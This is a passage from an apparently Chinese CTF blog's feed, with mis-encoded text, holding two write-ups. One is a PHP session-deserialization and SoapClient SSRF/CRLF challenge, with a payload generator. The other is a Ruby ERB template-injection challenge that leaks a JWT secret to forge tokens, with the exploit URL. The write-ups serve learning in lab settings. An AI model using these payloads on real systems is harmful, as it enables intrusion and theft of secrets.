</li><li><code>php</code>â€”-&gt;é”®å+ç«–çº¿ï¼ˆ|ï¼‰+ç»è¿‡serialize()å‡½æ•°å¤„ç†è¿‡çš„å€¼</li><li><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/011a6f2d-5c94-46fc-ba17-8758eeb94a48.png" alt="04.png">       </li><li><code>php_serialize</code>â€”-&gt;ç»è¿‡serialize()å‡½æ•°å¤„ç†è¿‡çš„å€¼ï¼Œä¼šå°†é”®åå’Œå€¼å½“ä½œä¸€ä¸ªæ•°ç»„åºåˆ—åŒ–   </li><li><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/d4410c44-8d12-4db3-a1cc-8502eeb791d0.png" alt="05.png">   </li><li>å¦‚æœèƒ½å¤Ÿæ”¹å˜åºåˆ—åŒ–çš„æ¨¡å¼ï¼Œæ¯”å¦‚é»˜è®¤æ˜¯PHPï¼Œå°†å…¶æ”¹ä¸º<code>php_serialize</code>ï¼Œå‡ºå…¥åºåˆ—åŒ–å‰é¢åŠ ä¸Š<code>|</code>ï¼Œè¿™æ ·ååºåˆ—åŒ–æ—¶ï¼ŒæŒ‰é»˜è®¤çš„<code>php</code>æ—¶ï¼Œä¼ å…¥çš„åºåˆ—åŒ–å°±è¢«ååºåˆ—åŒ–äº†      </li></ul></li></ul><ul><li><p>PHPåŸç”Ÿç±»<code>SoapClient</code>ï¼Œå½“å…¶ä¸­çš„<code>__call</code>æ–¹æ³•è§¦å‘æ—¶å¯ä»¥å‘é€HTTPå’ŒHTTPsè¯·æ±‚</p><ul><li><code>public SoapClient :: SoapClient ï¼ˆmixed $wsdl [ï¼Œarray $options ]ï¼‰</code>      </li><li>ç¬¬ä¸€ä¸ªå‚æ•°æŒ‡æ˜æ˜¯å¦ä¸º<code>wsdlæ¨¡å¼</code>     </li><li>ç¬¬äºŒä¸ªå‚æ•°ä¸ºä¸€ä¸ªæ•°ç»„ï¼Œå¦‚æœåœ¨wsdlæ¨¡å¼ä¸‹ï¼Œæ­¤å‚æ•°å¯é€‰ï¼›å¦‚æœåœ¨éwsdlæ¨¡å¼ä¸‹ï¼Œåˆ™å¿…é¡»è®¾ç½®locationå’Œurié€‰é¡¹ï¼Œå…¶ä¸­locationæ˜¯è¦å°†è¯·æ±‚å‘é€åˆ°çš„SOAPæœåŠ¡å™¨çš„URLï¼Œè€Œuri æ˜¯SOAPæœåŠ¡çš„ç›®æ ‡å‘½åç©ºé—´ã€‚   </li><li><a href="https://www.anquanke.com/post/id/153065#h2-1">soap</a>    </li></ul></li><li><p><a href="https://www.jianshu.com/p/d4c304dbd0af"><code>CRLF Injection</code></a>       </p><ul><li>ç®€å•è¯´å°±æ˜¯åœ¨è¯·æ±‚å¤´ä¸­æ³¨å…¥<code>\r\n</code>,ä»è€Œç”Ÿæˆæ–°çš„è¯·æ±‚å¤´ï¼Œæˆ–è€…è¦†ç›–åŸæ¥çš„è¯·æ±‚å¤´ï¼Œæˆ–è€…æ³¨å…¥<code>\r\n\r\n</code>,æ³¨å…¥è¯·æ±‚ï¼ˆå¤´å’Œä½“ç”±ä¸¤ä¸ª<code>\r\n</code>åˆ†å‰²ï¼‰     </li></ul></li></ul><h2 id="Try-To-Solve"><a href="#Try-To-Solve" class="headerlink" title="Try To Solve"></a>Try To Solve</h2><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>highlight_file(<span class="hljs-keyword">__FILE__</span>);$b = <span class="hljs-string">&#x27;implode&#x27;</span>;call_user_func($_GET[<span class="hljs-string">&#x27;f&#x27;</span>], $_POST);session_start();<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;name&#x27;</span>])) &#123;    $_SESSION[<span class="hljs-string">&#x27;name&#x27;</span>] = $_GET[<span class="hljs-string">&#x27;name&#x27;</span>];&#125;var_dump($_SESSION);$a = <span class="hljs-keyword">array</span>(reset($_SESSION), <span class="hljs-string">&#x27;welcome_to_the_lctf2018&#x27;</span>);call_user_func($b, $a);<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p>ä¸€å¼€å§‹ï¼Œç›´æ¥ä¸€ä¸ª<code>$_POST</code>æ²¡ååº”è¿‡æ¥<br><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/6b2ec884-06ae-4190-b0fd-89028778c220.png" alt="02.png"></p><p>å‘ç°<code>flag.php</code>      </p><pre><code><pre><code class="hljs php">only localhost can get flag!session_start();<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;only localhost can get flag!&#x27;</span>;$flag = <span class="hljs-string">&#x27;LCTF&#123;*************************&#125;&#x27;</span>;<span class="hljs-keyword">if</span>($_SERVER[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]===<span class="hljs-string">&quot;127.0.0.1&quot;</span>)&#123;       $_SESSION[<span class="hljs-string">&#x27;flag&#x27;</span>] = $flag;   &#125;only localhost can get flag!</code></pre></code></pre><p>è§£é¢˜æ€è·¯ï¼šé¦–å…ˆå¯ä»¥é€šè¿‡ç¬¬ä¸€ä¸ª<code>call_user_func</code>è¦†ç›–<code>serialize_handler</code>ä¸º<code>php_serialize</code>ï¼Œåœ¨nameä¸­å†™å…¥åˆ©ç”¨<code>soapClient</code>äº§ç”Ÿçš„åºåˆ—åŒ–ï¼›ç¬¬äºŒæ¬¡é€šè¿‡<code>extract</code>è¦†ç›–å˜é‡<code>b</code>ä¸º<code>call_user_func</code>ï¼Œnameä¸º<code>SoapClient</code>ï¼Œå½“<code>call_user_func</code>çš„å‚æ•°ä¸ºä¸€ä¸ªæ•°ç»„æ—¶ï¼Œä¼šæŠŠé”®åå½“ä½œä¸€ä¸ªç±»åï¼Œå€¼å½“ä½œæ–¹æ³•ï¼›</p><p><code>call_user_func($b, $a);</code>â€”â€”&gt;<code>call_user_func(call_user_func(array(SoapClient,&#39;welcome_to_the_lctf2018&#39;)))</code>â€”â€”&gt;<code>SoapClient-&gt;welcome_to_the_lctf2018()</code>â€”â€“&gt;æ²¡æœ‰è¿™ä¸ªæ–¹æ³•ï¼Œä»è€Œè°ƒç”¨<code>__call</code>       </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$target = <span class="hljs-string">&quot;http://127.0.0.1/flag.php&quot;</span>;$attack = <span class="hljs-keyword">new</span> SoapClient(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;location&#x27;</span> =&gt; $target,    <span class="hljs-string">&#x27;user_agent&#x27;</span> =&gt; <span class="hljs-string">&quot;N0rth3ty\r\nCookie: PHPSESSID=g6ooseaeo905j0q4b9qqn2n471\r\n&quot;</span>,    <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; <span class="hljs-string">&quot;123&quot;</span>));$payload = urlencode(serialize($attack));<span class="hljs-keyword">echo</span> $payload;<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p>ç¬¬ä¸€æ¬¡ä½¿ç”¨SoapClientç±»ä¼šæŠ¥é”™ï¼Œéœ€è¦åœ¨<code>php.ini</code>ä¸­æ‰“å¼€<br><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/3910e692-bdd4-40f7-b076-82fa36305fac.png" alt="01.png"></p><p>ä¼ å…¥ </p><pre><code>f=session_start&amp;name=[ç”Ÿæˆçš„payload]         POST: serializer_handler=php_serialize</code></pre><p>ç„¶åä¼ </p><pre><code>f=extract&amp;name=SoapClienPOST:b=call_user_func   </code></pre><p>æ¥è§¦å‘ç±»    </p><p>ä½†æˆ‘è¿™é‡Œæ²¡æˆåŠŸï¼Œè¯•äº†å¥½å‡ ä¸ªå¸ˆå‚…çš„éƒ½ä¸è¡Œ        </p><p>ç®—äº†    </p><p>å°±å½“ç§¯ç´¯çŸ¥è¯†ç‚¹å§</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Knowledge&quot;&gt;&lt;a href=&quot;#Knowledge&quot; class=&quot;headerlink&quot; title=&quot;Knowledge&quot;&gt;&lt;/a&gt;Knowledge&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;PHPä¸­SESSIONååºåˆ—åŒ–   &lt;ul&gt;
&lt;li&gt;PHPä¸­çš„sess</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="php" scheme="http://lll-nnn.github.io/categories/CTF/php/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="php" scheme="http://lll-nnn.github.io/tags/php/"/>
    
    <category term="serialize" scheme="http://lll-nnn.github.io/tags/serialize/"/>
    
    <category term="åŸç”Ÿç±»" scheme="http://lll-nnn.github.io/tags/%E5%8E%9F%E7%94%9F%E7%B1%BB/"/>
    
  </entry>
  
  <entry>
    <title>Flag Shop</title>
    <link href="http://lll-nnn.github.io/2021/05/04/BUU82/"/>
    <id>http://lll-nnn.github.io/2021/05/04/BUU82/</id>
    <published>2021-05-04T13:29:59.000Z</published>
    <updated>2021-05-04T14:27:04.355Z</updated>
    
    <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title="|_|-|"></a>|_|-|</h2><p>æ‰“å¼€ç¯å¢ƒ</p><p><img src="https://img13.360buyimg.com/ddimg/jfs/t1/172950/8/7918/21544/60915946Edcb47200/b52ca327067e551d.png" alt="01.png"></p><p>ç‚¹ä¸€ä¸‹<code>buy flag</code>     </p><p>å¼¹å‡ºäº†<code>&#123;&quot;title&quot;:&quot;error&quot;,&quot;message&quot;:&quot;no enough jkl&quot;&#125;</code>     </p><p>æƒ³åˆ°äº†åº”è¯¥æ˜¯è¦ä¼ªé€ cookie     </p><p>é¡ºä¾¿çœ‹çœ‹<code>robots.txt</code>ï¼Œå±…ç„¶æœ‰    </p><pre><code>User-agent: *Disallow: /filebak     </code></pre><p><code>/filebak</code>     </p><pre><code>```rubyrequire &#39;sinatra&#39;require &#39;sinatra/cookies&#39;require &#39;sinatra/json&#39;require &#39;jwt&#39;require &#39;securerandom&#39;require &#39;erb&#39;set :public_folder, File.dirname(__FILE__) + &#39;/static&#39;FLAGPRICE = 1000000000000000000000000000ENV[&quot;SECRET&quot;] = SecureRandom.hex(64)configure do  enable :logging  file = File.new(File.dirname(__FILE__) + &#39;/../log/http.log&#39;,&quot;a+&quot;)  file.sync = true  use Rack::CommonLogger, fileendget &quot;/&quot; do  redirect &#39;/shop&#39;, 302endget &quot;/filebak&quot; do  content_type :text  erb IO.binread __FILE__endget &quot;/api/auth&quot; do  payload = &#123; uid: SecureRandom.uuid , jkl: 20&#125;  auth = JWT.encode payload,ENV[&quot;SECRET&quot;] , &#39;HS256&#39;  cookies[:auth] = authendget &quot;/api/info&quot; do  islogin  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#39;HS256&#39; &#125;  json(&#123;uid: auth[0][&quot;uid&quot;],jkl: auth[0][&quot;jkl&quot;]&#125;)endget &quot;/shop&quot; do  erb :shopendget &quot;/work&quot; do  islogin  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#39;HS256&#39; &#125;  auth = auth[0]  unless params[:SECRET].nil?    if ENV[&quot;SECRET&quot;].match(&quot;#&#123;params[:SECRET].match(/[0-9a-z]+/)&#125;&quot;)      puts ENV[&quot;FLAG&quot;]    end  end  if params[:do] == &quot;#&#123;params[:name][0,7]&#125; is working&quot; then    auth[&quot;jkl&quot;] = auth[&quot;jkl&quot;].to_i + SecureRandom.random_number(10)    auth = JWT.encode auth,ENV[&quot;SECRET&quot;] , &#39;HS256&#39;    cookies[:auth] = auth    ERB::new(&quot;&lt;script&gt;alert(&#39;#&#123;params[:name][0,7]&#125; working successfully!&#39;)&lt;/script&gt;&quot;).result  endendpost &quot;/shop&quot; do  islogin  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#39;HS256&#39; &#125;  if auth[0][&quot;jkl&quot;] &lt; FLAGPRICE then    json(&#123;title: &quot;error&quot;,message: &quot;no enough jkl&quot;&#125;)  else    auth &lt;&lt; &#123;flag: ENV[&quot;FLAG&quot;]&#125;    auth = JWT.encode auth,ENV[&quot;SECRET&quot;] , &#39;HS256&#39;    cookies[:auth] = auth    json(&#123;title: &quot;success&quot;,message: &quot;jkl is good thing&quot;&#125;)  endenddef islogin  if cookies[:auth].nil? then    redirect to(&#39;/shop&#39;)  endend```   </code></pre><p>è™½ç„¶çœ‹ä¸æ‡‚æ˜¯å•¥ï¼Œä½†çœ‹åˆ°äº†jwt     </p><p>cookieåº”è¯¥å°±æ˜¯jwtäº†å§     </p><p>è§£ç ä¸€ä¸‹     </p><p><img src="https://img11.360buyimg.com/ddimg/jfs/t1/181071/5/2256/71195/60915948Eaa5fb2dd/e6380093c94ee610.png" alt="02.png">   </p><p>ç¡®å®ï¼Œè¯•ç€ç”¨<code>jwtcrack</code>çˆ†ç ´ä¸€ä¸‹secret      </p><p>çˆ†äº†ä¸€ä¼šï¼Œæ„Ÿè§‰çˆ†ä¸å‡ºæ¥    </p><p>éš¾é“ä¸æ˜¯è¿™ä¸ªè€ƒç‚¹    </p><p>å›å»çœ‹é‚£ä¸ªæºç     </p><p>çœ‹ä¸æ‡‚     </p><p>è¿˜æ˜¯å»çœ‹WPå§   </p><hr><p>rubyçš„ERBæ¨¡æ¿æ³¨å…¥     </p><p>ä¸»è¦çš„ä»£ç     </p><pre><code>```rubyget &quot;/work&quot; do  islogin  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#39;HS256&#39; &#125;  auth = auth[0]  unless params[:SECRET].nil?    if ENV[&quot;SECRET&quot;].match(&quot;#&#123;params[:SECRET].match(/[0-9a-z]+/)&#125;&quot;)      puts ENV[&quot;FLAG&quot;]    end  end  if params[:do] == &quot;#&#123;params[:name][0,7]&#125; is working&quot; then    auth[&quot;jkl&quot;] = auth[&quot;jkl&quot;].to_i + SecureRandom.random_number(10)    auth = JWT.encode auth,ENV[&quot;SECRET&quot;] , &#39;HS256&#39;    cookies[:auth] = auth    ERB::new(&quot;&lt;script&gt;alert(&#39;#&#123;params[:name][0,7]&#125; working successfully!&#39;)&lt;/script&gt;&quot;).result  endend```      </code></pre><p>å‚æ•°<code>SECRET</code>ä¸çœŸçš„<code>SECRET</code>åŒ¹é…ï¼ŒæˆåŠŸåˆ™è¿”å›flag    </p><p>å‚æ•°<code>do</code>ä¸<code>name</code>ï¼Œå¦‚æœdoçš„å€¼ä¸nameçš„å‰ä¸ƒä½åŠ ä¸Š<code> is working</code>ä¸€æ ·ï¼Œä¼šå¼¹å‡º<code>&lt;script&gt;alert(&#39;#&#123;params[:name][0,7]&#125; working successfully!&#39;)&lt;/script&gt;</code><br>è¿™é‡Œå­˜åœ¨æ¨¡æ¿æ³¨å…¥</p><p>REBæ¨¡æ¿æ³¨å…¥çš„æ ¼å¼<code>&lt;%=7*7%&gt;</code>â€”â€”-&gt;49      </p><p>ç„¶åæ˜¯rubyä¸­çš„<a href="https://docs.ruby-lang.org/en/2.4.0/globals_rdoc.html">é¢„å®šä¹‰å˜é‡</a>â€“&gt;<code>$&#39;</code>è¿”å›æœ€åä¸€æ¬¡æˆåŠŸåŒ¹é…å³è¾¹çš„å­—ç¬¦ä¸²      </p><p>æœ€åä¸€æ¬¡æˆåŠŸåŒ¹é…ï¼Ÿï¼Ÿï¼Ÿä¸Šé¢é‚£ä¸ªï¼Ÿï¼Ÿ</p><p>æ„é€ <code>&lt;%=$&#39;%&gt;</code>æ­£å¥½ä¸ƒä½     </p><p>è¿˜è¦hexç¼–ç ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚       </p><p>payloadï¼š<code>/work?SECRET=&amp;name=%3C%25%3D%24%27%25%3E&amp;do=%3C%25%3D%24%27%25%3E%20is%20working</code>     </p><p><img src="https://img14.360buyimg.com/ddimg/jfs/t1/171834/33/7788/70013/60915948Eff3e1215/1de2e42b943ae0db.png" alt="03.png">   </p><p>è¿”å›çš„å°±æ˜¯SECRET   </p><p>æ„é€ æ–°çš„jwt    </p><p><img src="https://img13.360buyimg.com/ddimg/jfs/t1/194760/8/1229/73202/60915947E03771f73/f2ef6f29d8c4d0dc.png" alt="04.png"> </p><p>å†™å…¥cookie     </p><p>flagåœ¨è¿”å›å¤´çš„cookieé‡Œ    </p><p><img src="https://img11.360buyimg.com/ddimg/jfs/t1/180216/2/2292/80981/60915947E137ed448/8c24414f41a9b8de.png" alt="05.png">     </p><p><a href="https://www.anquanke.com/post/id/86867">REB SSTI</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;|_|-|&quot;&gt;&lt;/a&gt;|_|-|&lt;/h2&gt;&lt;p&gt;æ‰“å¼€ç¯å¢ƒ&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img13.360buyimg.com/ddimg/jfs/t1/17295</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="jwt" scheme="http://lll-nnn.github.io/categories/CTF/jwt/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="jwt" scheme="http://lll-nnn.github.io/tags/jwt/"/>
    
    <category term="ruby" scheme="http://lll-nnn.github.io/tags/ruby/"/>
    
    <category term="ERB" scheme="http://lll-nnn.github.io/tags/ERB/"/>
    
    <category term="SSTI" scheme="http://lll-nnn.github.io/tags/SSTI/"/>
    
  </entry>
  
</feed>
